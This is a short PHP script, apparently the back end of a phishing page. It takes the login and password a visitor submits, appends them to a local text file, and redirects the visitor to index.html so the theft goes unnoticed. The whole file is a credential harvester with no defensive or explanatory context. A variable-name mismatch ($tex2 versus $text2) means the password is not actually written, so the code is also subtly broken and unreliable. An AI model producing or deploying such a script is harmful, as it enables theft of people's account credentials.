<?php 
$file=fopen('mes.txt','a+'); 
$name = $_POST['login'];
$pass = $_POST['password'];
$text = "Логин: $name \n"; 
$tex2 = "Пароль: $pass \n";
fputs($file,$text); 
fputs($file,$text2);
fclose($file);
header("Location:index.html");
?>